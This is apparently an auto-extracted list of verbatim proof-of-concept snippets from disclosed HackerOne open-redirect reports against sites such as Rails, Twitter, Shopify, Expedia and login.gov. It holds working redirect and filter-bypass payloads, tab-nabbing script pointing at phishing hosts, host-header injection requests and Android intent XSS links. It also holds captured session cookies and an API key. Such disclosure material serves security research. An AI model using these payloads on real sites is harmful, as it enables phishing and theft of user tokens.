# Open redirect — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1865991 Open Redirect Vulnerability in Action Pack — ibb — $2,400 — Open Redirect
Source: `hackerone/reports/2023/1865991.md` (https://hackerone.com/reports/1865991)

```
redirect_to(params[:some_param])
```

## #437142 Instant open redirect on Live preview WEB Ide opening — gitlab — $1,000 — Open Redirect
Source: `hackerone/reports/2020/437142.md` (https://hackerone.com/reports/437142)

```
window.open("https://evil.com","_top");
```

```
{
  "main": "index.js",
  "dependencies": {
    "vue": "latest"
  }
}
```

## #904059 Open Redirect (6.0.0 < rails < 6.0.3.2) — rails — $1,000 — Open Redirect
Source: `hackerone/reports/2020/904059.md` (https://hackerone.com/reports/904059)

```
  redirect_to request.params[:location]
end

private
  def actionable_request?(request)
    request.show_exceptions? && request.post? && request.path == endpoint
  end

  def redirect_to(location)
    body = "<html><body>You are being <a href=\"#{ERB::Util.unwrapped_html_escape(location)}\">redirected</a>.</body></html>"

    [302, {
      "Content-Type" => "text/html; charset=#{Response.default_charset}",
      "Content-Length" => body.bytesize.to_s,
      "Location" => location,
    }, [body]]
  end
```

```
❯ rails -v
Rails 6.0.3.1

❯ RAILS_ENV=production rails s
...
* Environment: production
* Listening on tcp://0.0.0.0:3000
```

```
<form method="post" action="http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/">
	<button type="submit">click!</button>
</form>
```

## #635597 Wrong Interpretation of URL encoded characters, showing different punny code leads to redirection on different domain — x — $560 — Open Redirect
Source: `hackerone/reports/2019/635597.md` (https://hackerone.com/reports/635597)

```
%E2%80%AE - RTLO Character
%E2%80%8E - LEFT-TO-RIGHT MARK
%E2%80%91 - Non breaking hyphen
%E2%80%A9 - PARAGRAPH SEPARATOR
%E2%80%AA 0 Right-to-left embedding
```

```
https://twitter.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt.com
```

## #781673 Accepting error message on twitter sends you to attacker site — x — $560 — Open Redirect
Source: `hackerone/reports/2020/781673.md` (https://hackerone.com/reports/781673)

```
<html>
<body>
<h1> This is hacker's site</h1>
<a href="https://twitter.com/i/flow" onClick="userClicked()">Click here</a> //This may also be made an auto-redirection to twitter from attacker site

</body>
<script>

function userClicked(){
localStorage.setItem("ClickCount", 1);  //Setting up a value in local storage to detected user click
}


if(localStorage.getItem("ClickCount")==1)
   {
      localStorage.setItem("ClickCount", 0); 
      if(localStorage.getItem("ClickCount")==0) 
         {
            window.location.replace("https://hackerone.com/twitter");  //This can any attacker controlled website
         }
   }
   
   

</script>
</html>
```

```
      localStorage.setItem("ClickCount", 0); 
      if(localStorage.getItem("ClickCount")==0) 
         {
            window.location.replace("https://hackerone.com/twitter");  //This can any attacker controlled website
         }
```

## #1145563 Tab nabbing in Hackerone inbox. — security — $500 — Open Redirect
Source: `hackerone/reports/2021/1145563.md` (https://hackerone.com/reports/1145563)

```
<script>
if (window.opener) window.opener.parent.location.replace('http://phishing.com');
if (window.parent != window) window.parent.location.replace('http://phishing.com');
</script>
```

## #160047 [apps.shopify.com] Open Redirect — shopify — $500 — Open Redirect
Source: `hackerone/reports/2016/160047.md` (https://hackerone.com/reports/160047)

```
HTTP/1.1 301 Moved Permanently
Server: Cowboy
Date: Wed, 17 Aug 2016 11:48:27 GMT
Connection: close
Location: //blackfan.ru
```

## #125000 Open Redirect in m.uber.com — uber — $500 — None
Source: `hackerone/reports/2016/125000.md` (https://hackerone.com/reports/125000)

```
HTTP/1.1 303 See Other
...
Location: //youtube.com/%2F../
```

## #1066410 Google API key leaks and security misconfiguration leads Open Redirect Vulnerability — clario — $300 — Open Redirect
Source: `hackerone/reports/2021/1066410.md` (https://hackerone.com/reports/1066410)

```
'https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=AIzaSyAw-SpLHVTIP3IFEIkckCuEmIhnUrY9OrQ';
```

```
You can type anydomain and any urls only thing you need to do is add 
```

## #400982 Open redirect in securegatewayaccess.com / secure.chaturbate.com via prejoin_data parameter — chaturbate — $250 — Open Redirect
Source: `hackerone/reports/2018/400982.md` (https://hackerone.com/reports/400982)

```
https://securegatewayaccess.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c
```

```
https://secure.chaturbate.com/post?prejoin_data=domain%2Fevil.com/?=&weg_digest=eacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c
```

```
https://chaturbate.com/external_link/?url=https%3A%2F%2Fsecure.chaturbate.com%2Fpost%3Fprejoin_data%3Ddomain%252Fevil.com%2F%3F%3D%26weg_digest%3Deacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c
```

## #387007 [idp.fr.cloud.gov] Open Redirect — gsa_bbp — $150 — Open Redirect
Source: `hackerone/reports/2018/387007.md` (https://hackerone.com/reports/387007)

```
https://idp.fr.cloud.gov//blackfan.ru/..;/css
```

```
HTTP/1.1 302 Found
...
Location: //blackfan.ru/..;/css/
...
```

## #798742 open redirect in eb9f.pivcac.prod.login.gov — gsa_bbp — $150 — Open Redirect
Source: `hackerone/reports/2020/798742.md` (https://hackerone.com/reports/798742)

```
https://eb9f.pivcac.prod.login.gov/?nonce=wI0UglN84A06Q4z4JnkZVc3i1V8%3D&redirect_uri=https%3A%2F%2Fgoogle.com%23%40secure.login.gov%2Flogin%2Fpiv_cac
```

## #1977222 Open redirect on "Unsupported browser" warning — nextcloud — $150 — Open Redirect
Source: `hackerone/reports/2023/1977222.md` (https://hackerone.com/reports/1977222)

```
			const urlParams = new URLSearchParams(window.location.search)
			if (urlParams.has('redirect_url')) {
				const redirectPath = Buffer.from(urlParams.get('redirect_url'), 'base64').toString() || '/'
				window.location = redirectPath
				return
			}
```

## #504751 Open Redirect — omise — $100 — Open Redirect
Source: `hackerone/reports/2019/504751.md` (https://hackerone.com/reports/504751)

```
GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
Host: www.omise.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _omise-website_session=OHdwcEpSZVUvVXRqS3F3bUVyUUhaZ2pVY00wVWJ1c042RWZZNHdOendwUEkzS0dnaTJPb1hub3ZxcGhkUk5FNy96blpiNjJPL0hhMUZBdS9Jb2ZFY25BcWxzcXNjbTAyclJLTlo0VGUvbzBsa085MXhNUG9uZFpzRnBBeEp4a2MtLU9ONHdIWVBZdWZlS3VIVXVYTVNkOVE9PQ%3D%3D--cf8f4d43247d9eb5aa162a3f00fabc02bbda3b34
Upgrade-Insecure-Requests: 1

## Impact
```

## #16718 Open Redirect login account — slack — $100 — Open Redirect
Source: `hackerone/reports/2014/16718.md` (https://hackerone.com/reports/16718)

```
https://asdasda.slack.com/?redir=llink?url=https://twitter.com/
```

## #625546 Open Redirection leads to redirect Users to malicious website — unikrn — $50 — Open Redirect
Source: `hackerone/reports/2020/625546.md` (https://hackerone.com/reports/625546)

```
GET /s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome HTTP/1.1
Host: unikrn.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=dc2e81d88677939ce456f73a18c2a09b51561192429; CW=fplg5rn6s118blhgpb20hi0phlhuv4jr
```

```
GET /s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome HTTP/1.1
Host: unikrn.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=dc2e81d88677939ce456f73a18c2a09b51561192429; CW=fplg5rn6s118blhgpb20hi0phlhuv4jr
'''
4 . Note the Value of ``l`` parametre 
5 . Or just Click on this [URL POC](https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome) ***You must be logged in***
6 . Redirected successfully and Javascript code Executed .

-------
```

## #94637 Host Header Injection/Redirection — whisper — $30 — Open Redirect
Source: `hackerone/reports/2016/94637.md` (https://hackerone.com/reports/94637)

```
GET / HTTP/1.1
Host: crowdshield.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

HTTP/1.1 301 Moved Permanently
```

## #1788006 Open Redirect in Logout & Login — expediagroup_bbp — - — Open Redirect
Source: `hackerone/reports/2023/1788006.md` (https://hackerone.com/reports/1788006)

```
GET /?logout=1 HTTP/2
Host: www.expedia.com
Cookie:  { REDACTED }
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers

## Default Response
```

```
GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2
Host: www.expedia.com
Cookie: { REDACTED }
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

## #1946534 Open redirect due to scanning QR code via brave browser — brave — - — Open Redirect
Source: `hackerone/reports/2023/1946534.md` (https://hackerone.com/reports/1946534)

```
    Increased Risk of Phishing: Exploiting this vulnerability could allow attackers to direct Brave users to malicious sites that can be used to steal sensitive information such as usernames, passwords, banking and other personal information.
```

```
    Exposure to malware: Malicious sites that users are redirected to may also contain malware that can infect Brave users' devices with malicious programs such as viruses, Trojans or ransomware.
```

```
    Privacy loss: Brave users may also be at risk of privacy loss if sensitive information is stolen as a result of the exploitation of this vulnerability.
```

## #108113 Bypassing callback_url validation on Digits — x — - — Open Redirect
Source: `hackerone/reports/2016/108113.md` (https://hackerone.com/reports/108113)

```
https://attacker.com%ff@www.periscope.tv
--------\  authority   /\   hostname   /
```

```
https://attacker.com?@www.periscope.tv
--------\ hostname /-\     query     /
```

## #1579374 Browser is not following proper flow for redirection cause open redirect  — brave — - — None
Source: `hackerone/reports/2022/1579374.md` (https://hackerone.com/reports/1579374)

```
But when we try to go to a site like https://l.facebook.com/l.php?u=https://test.facebook-whitehat.com/ then brave browser is directly requesting to https://test.facebook-whitehat.com/ (a domain resticted by facebook which can be used for testing prepose) without asking Facebook server  whether should I redirect or not. But other browser are properly following the flow. 

## Products affected: 

 Windows 11, Version 1.38.119 Chromium: 101.0.4951.67 (Official Build) (64-bit)

## Steps To Reproduce:

1. Open brave browser in windows
2.  Intercept the requests
3. Go to 
```

## #1257753 Open Redirect on www.redditinc.com via `failed` query param — reddit — - — Open Redirect
Source: `hackerone/reports/2022/1257753.md` (https://hackerone.com/reports/1257753)

```
POST /ama HTTP/1.1
Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
Cookie: CRAFT_CSRF_TOKEN=958b77eaad06452d68f0be48c5edf5b0d928b51a6c4afbb5f2f95397f18b43e2a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22jZdkLxGgRNVPWIF2OyxH-Lig9pTukLSS8OxYOVST%22%3B%7D;OptanonAlertBoxClosed=2021-07-12T01:35:46.350Z;OptanonConsent=isIABGlobal=false&datestamp=Mon+Jul+12+2021+04%3A35%3A46+GMT%2B0300+(Arabian+Standard+Time)&version=6.13.0&hosts=&consentId=71f221d5-8a57-4a90-9844-0a863bfc837d&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 1508
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36
Host: www.redditinc.com
Connection: Keep-alive

------------YWJkMTQzNDcw
```

```
    <form action="https://www.redditinc.com/ama" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="action" value="zendesk&#47;default&#47;submit" />
      <input type="hidden" name="agreement" value="yes" />
      <input type="hidden" name="description" value="555" />
      <input type="hidden" name="email" value="sample&#64;email&#46;tst" />
      <input type="hidden" name="email&#95;confirm" value="sample&#64;email&#46;tst" />
      <input type="hidden" name="failed" value="http&#58;&#47;&#47;0bc7dpd4u9tmsh9ruo3n8644pvvlja&#46;burpcollaborator&#46;net" />
      <input type="hidden" name="name" value="pHqghUme" />
      <input type="hidden" name="organization" value="Acunetix" />
      <input type="hidden" name="participants" value="pHqghUme" />
      <input type="hidden" name="redirect" value="74bcbfb4f9c047fb4e467dd203ca3b30f2b31216551ab9db2bf44911c029d506thank&#45;you&#47;ama&#45;form&#45;step&#45;1" />
      <input type="hidden" name="subject" value="AMA&#32;Request" />
      <input type="hidden" name="success" value="thank&#45;you&#47;ama&#45;form&#45;step&#45;1" />
      <input type="hidden" name="ticket&#95;form&#95;id" value="360000307211" />
      <input type="hidden" name="timeframe" value="next&#45;week" />
      <input type="hidden" name="timezone" value="&#40;GMT&#45;05&#58;00&#41;&#32;Eastern&#32;Time&#32;&#40;US&#32;&amp;&#32;Canada&#41;" />
      <input type="submit" value="Submit request" />
    </form>
```

## #2555949 █████████ (Android): Vulnerable to Javascript Injection and Open redirect — deptofdefense — - — Open Redirect
Source: `hackerone/reports/2024/2555949.md` (https://hackerone.com/reports/2555949)

```
<body>
    <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end">Open XSS</a>

    <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=https://URL;end">Open URL</a>

</body>
```

```
val intent = Intent().apply {  
    setClassName("█████", "███████.kotlin.MVVM.Utils.Web.WebviewActivity")  
    putExtra("URL", "javascript:(function() { alert('XSS by Cleanchain') })()")  
}  
startActivity(intent)

val intent = Intent().apply {  
    setClassName("████", "██████.kotlin.MVVM.Utils.Web.WebviewActivity")  
    putExtra("URL", "https://URL")  
}  
startActivity(intent)
```

```
<body>
    <a href="intent://app/feedback#Intent;scheme=chdr;package=██████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end">Open XSS - █████████</a>

    <a href="intent://app/feedback#Intent;scheme=chdr;package=███;S.URL=https://URL;end">Open URL - ███</a>

</body>
```

## #246897 Open Redirect — x — - — Open Redirect
Source: `hackerone/reports/2017/246897.md` (https://hackerone.com/reports/246897)

```
- by clicking on this link you will get redirect to https://google.com  as you can see it on  
```

## #840736 Open Redirect filter bypass through '\' character via URL parameter — myndr — - — Open Redirect
Source: `hackerone/reports/2020/840736.md` (https://hackerone.com/reports/840736)

```
The vulnerable URL parameter is 
```

```
The trusted domain (or string) is 
```

```
It can be bypassed only from its beginning!  (between 
```

## #3972760 Open redirect on app.hey.com bypasses HEY desktop's internal-origin allowlist and loads attacker content inside a HEY BrowserWindow — basecamp — - — Open Redirect
Source: `hackerone/reports/2026/3972760.md` (https://hackerone.com/reports/3972760)

```
curl -sI "https://app.hey.com/proxy_image/HTTPS%3A%2F%2Fexample.com%2F"

HTTP/2 302
location: HTTPS://example.com/
```

```
curl -sI "https://app.hey.com/proxy_image/https%3A%2F%2Fexample.com%2F"

HTTP/2 302
location: https://gopher.hey.com/sNnTdUWAvh27xF-f273gMtyxvGbOnLHSflbedosO23Ns=/https://example.com/
```

```
https://app.hey.com/proxy_image/HTTPS%3A%2F%2Fexample.com%2F?x=/print
```

## #3933198 wordpress.org/openverse/: unauthenticated open redirect — `str_replace()`'s 4th arg is a count, not a limit; bypasses WordPress.org SSO allow-list — wordpress — - — Open Redirect
Source: `hackerone/reports/2026/3933198.md` (https://hackerone.com/reports/3933198)

```
	foreach ( array( '404', 'archive', 'author', 'category', 'tag', 'taxonomy', 'date', 'embed', 'home', 'frontpage', 'privacypolicy', 'page', 'paged', 'search', 'single', 'singular', 'attachment' ) as $template_type ) {
		add_filter( $template_type . '_template', __NAMESPACE__ . '\use_index_php_as_template' );
	}
```

```
function disable_parse_request( $return, $wp ) {
	// Avoid E_WARNING: array_keys() expects parameter 1 to be array, null given in wp-includes/class-wp.php:548
	$wp->query_vars = array();

	return false;
}
add_filter( 'do_parse_request', __NAMESPACE__ . '\disable_parse_request', 10, 2 );
```

```
 * Examples:
 * - https://ru.wordpress.org/openverse → {ov_redirect_url}/ru/
 * - https://wordpress.org/openverse/search/?q=dog → {ov_redirect_url}/search/?q=dog
```

## #3966599 Unauthenticated go-httpbin servers : Leads to Cookie Tossing on *.aws.dev and Open Redirect — aws_vdp — - — Missing Authentication for Critical Function
Source: `hackerone/reports/2026/3966599.md` (https://hackerone.com/reports/3966599)

```
████████
████████
████████
```

```
$ curl -s ████████redirect-to?url=http://google.com -D - -o /dev/null
HTTP/1.1 302 Found
Server: ████████
Date: Mon, 24 Aug 2026 21:27:43 GMT
Content-Length: 0
Connection: keep-alive
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Location: http://google.com

$
```

```
████████cookies/set?dos_poc=<script>alert(1)</script>&attr[Domain]=aws.dev
```

## #1327742 Steal any users `access_token` via open redirect in https://streamlabs.com/global/identity?popup=1&r= — logitech — - — None
Source: `hackerone/reports/2021/1327742.md` (https://hackerone.com/reports/1327742)

```
https://streamlabs.com/global/identity?r=https://darthvapes.tv
https://streamlabs.com/global/identity?r=https://dragynslair.live/
https://streamlabs.com/global/identity?r=https://franmg.net/merch
https://streamlabs.com/global/identity?r=https://itzyony2.com
https://streamlabs.com/global/identity?r=https://lmgtwitch.com
https://streamlabs.com/global/identity?r=https://maitresharinganv1.com
https://streamlabs.com/global/identity?r=https://themavshow.tv
https://streamlabs.com/global/identity?r=https://veterangamertv.com
https://streamlabs.com/global/identity?r=https://www.koopatroop.com
https://streamlabs.com/global/identity?r=https://www.lokenplays.com
https://streamlabs.com/global/identity?r=https://yagurlbubblezl4d.com
```

```
127.0.0.1  dragynslair.live
```

## #283460 Open Redirect Protection Bypass — x — - — Open Redirect
Source: `hackerone/reports/2017/283460.md` (https://hackerone.com/reports/283460)

```
Vulnerable point 
```

## #210875 use of unsafe host header leads to open redirect — rockstargames — - — Violation of Secure Design Principles
Source: `hackerone/reports/2017/210875.md` (https://hackerone.com/reports/210875)

```
<?php
$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$trimed_link=explode($actual_link,"/Share");

$short=DB_Create_short_link($trimed_link);
echo $short;
?>
```

```
GET /feed/102126489/activity/3073813190982488067/share/Person/getcontent?_=1488723542848 HTTP/1.1
Host: socialclub.rockstargames.com
```

```
GET /feed/102126489/activity/2960911889698885091/share/Person/getcontent?_=1488725310707 HTTP/1.1
Host: socialclub.rockstargames.com.this.is.my.domain.evil.net
```

## #1782514 CVE-2022-45402: Apache Airflow: Open redirect during login — ibb — - — Open Redirect
Source: `hackerone/reports/2022/1782514.md` (https://hackerone.com/reports/1782514)

```
Hi,

In Apache Airflow, there is a parameter "next" on the Login page. And after a successful login, we're redirected to this parameter's value. 
I see there are some preventions for the open redirect bug. However, I can bypass these preventions using "/\google.com"

It seems this parameter accepts anything after the slash "/" character. And, browsers parse "/\" as "http://" in the location header.

For reproducing, you can try to login on the http://127.0.0.1:8080/login/?next=/\google.com

I tested this bug in the last version (v2.4.2)

Regards,
Bugra Eskici
```

## #3775183 Incomplete fix for CVE-2022-35406: meta-redirect content-type check bypassable via parameter injection — portswigger — - — Open Redirect
Source: `hackerone/reports/2026/3775183.md` (https://hackerone.com/reports/3775183)

```
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

META = ('<html><head><meta http-equiv="refresh" '
        'content="0;url=http://127.0.0.1:9000/stolen"></head><body>x</body></html>')

CASES = {
    "/ct_plain":       "text/plain",                 # control: blocked
    "/ct_param_plain": "text/plain; x=hello",        # control: blocked (no 'html')
    "/ct_param_html":  "text/plain; x=html",         # BYPASS: followed
    "/ct_texthtml":    "text/plain; x=text/html",    # BYPASS: followed
    "/ct_quoted":      'text/plain; x="text/html"',  # BYPASS: followed
}

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def log_message(self, *a): pass
    def do_GET(self):
        ct = CASES.get(self.path)
        if ct is None:
            self.send_response(404); self.send_header("Content-Length","0")
            self.send_header("Connection","close"); self.end_headers(); return
        b = META.encode()
        self.send_response(200)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(b)))
        self.send_header("Connection", "close")
        self.end_headers()
        try: self.wfile.write(b)
        except BrokenPipeError: pass
        self.close_connection = True

if __name__ == "__main__":
    print("PoC server on http://127.0.0.1:8000")
    HTTPServer(("127.0.0.1", 8000), H).serve_forever()
```

```
GET /ct_param_html HTTP/1.1
Host: 127.0.0.1:8000
Referer: http://127.0.0.1:8000/secret-page
Connection: close
```

```
GET /ct_param_html HTTP/1.1
Host: 127.0.0.1:8000
Referer: http://127.0.0.1:8000/secret-page
Connection: close
'''

4. The response is Content-Type: text/plain (with a bogus ; x=html parameter) containing a <meta http-equiv="refresh"> redirect. Despite the non-renderable text/plain type, the Follow redirection button appears.
```

## #158019 Host Header Injection/Redirection in: https://www.instacart.com/ — instacart — - — Open Redirect
Source: `hackerone/reports/2016/158019.md` (https://hackerone.com/reports/158019)

```
GET / HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

HTTP/1.1 301 Moved Permanently
```

## #1050193 [intensedebate.com] Open Redirect — automattic — - — Open Redirect
Source: `hackerone/reports/2021/1050193.md` (https://hackerone.com/reports/1050193)

```
GET /fb-connect/logoutRedir.php?goto=\http://\ HTTP/1.1
Host: intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: y=y;
Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 302 Found
Server: nginx
Date: Thu, 03 Dec 2020 21:52:42 GMT
Content-Type: text/html; charset=utf-8
Connection: close
P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
Set-Cookie: fbName=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: fbUrl=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: fbPic=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Location: \http://\
Content-Length: 0
```

```
GET /fb-connect/logoutRedir.php?goto=\http://\ HTTP/1.1
Host: intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: y=y;
Upgrade-Insecure-Requests: 1
'''
```

## #309058 Open Redirect on the nl.wordpress.net — wordpress — - — Open Redirect
Source: `hackerone/reports/2018/309058.md` (https://hackerone.com/reports/309058)

```
GET /@google.com HTTP/1.1
Host: nl.wordpress.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 301 Moved Permanently
Date: Thu, 25 Jan 2018 17:26:07 GMT
Server: Apache
Location: http://nl.wordpress.org@google.com
Content-Length: 242
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
```

```
Location: http://nl.wordpress.org@google.com
```

## #459286 protocol & Ports are not shown in third-party site redirect warning page  — semrush — - — Open Redirect
Source: `hackerone/reports/2019/459286.md` (https://hackerone.com/reports/459286)

```
<a href="ftp://evil.com:1337" id="js-site-link" class="site_link" data-test-site-link="">
Go to site </a>
```

## #405697 Open redirection in OAuth — shopify — - — Open Redirect
Source: `hackerone/reports/2018/405697.md` (https://hackerone.com/reports/405697)

```
POST /526915/apps/2544979/install_on_dev_shop HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://partners.shopify.com/526915/apps/2544979
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Cookie: last_shop=mido-2.myshopify.com; optimizelyEndUserId=oeu1536089316039r0.9037032785131875; _y=a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _shopify_y=a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _shopify_fs=2018-09-04T19%3A28%3A36.510Z; _ga=GA1.2.a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _gid=GA1.2.352493204.1536089321; _ceg.s=pek3q2; _ceg.u=pek3q2; __hstc=138892268.672c096176060d98d2c72b786b0c0116.1536089327774.1536094057487.1536106976076.3; hubspotutk=672c096176060d98d2c72b786b0c0116; __utma=262205262.672852694.1536089354.1536089354.1536096223.2; __utmz=262205262.1536096223.2.2.utmcsr=partners.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/; master_device_id=6b415960-b260-4a0a-a281-5c9b4be57c37; __hssrc=1; _partners_session=6cc122023cd45fc2becb197861cfd156; __utmc=262205262; __hssc=138892268.1.1536106976076
Connection: keep-alive
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=dO84UJSGLnRDTF3yLennlB1esNOx0SxdN0WJSGY8e%2F%2FquALL%2BQSBxb%2ByPgiyxRtoS8aCgQ83x33JxPAmrbHYdA%3D%3D&install_app%5BSelect+a+store%5D=$$.myshopify.com
```

```
HTTP/1.1 302 Found
Server: nginx/1.15.2
Date: Wed, 05 Sep 2018 01:01:51 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Location: https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb
X-Robots-Tag: none
Cache-Control: no-cache
X-Request-Id: e4c2d9e3a7f47203a309afb03f731b38
X-Runtime: 0.368401
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Dc: gke
X-Dc: gke
Content-Length: 391

